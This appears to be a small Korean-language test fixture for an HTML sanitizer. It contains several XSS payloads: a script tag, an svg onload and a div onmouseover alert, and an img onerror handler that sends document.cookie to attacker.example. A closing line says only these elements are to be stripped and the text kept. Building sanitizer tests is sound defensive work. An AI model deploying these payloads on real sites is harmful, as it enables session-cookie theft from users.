---
id: DOC-H1
type: guide
---

# 스크립트와 이벤트 처리기

<script>window.stolen = document.cookie;</script>

<img src="x" onerror="fetch('https://attacker.example/'+document.cookie)">

<svg onload="alert(1)"><circle r="10" /></svg>

<div onmouseover="alert('hover')">마우스를 올려 보세요</div>

본문은 남고 위의 것들만 사라져야 한다.
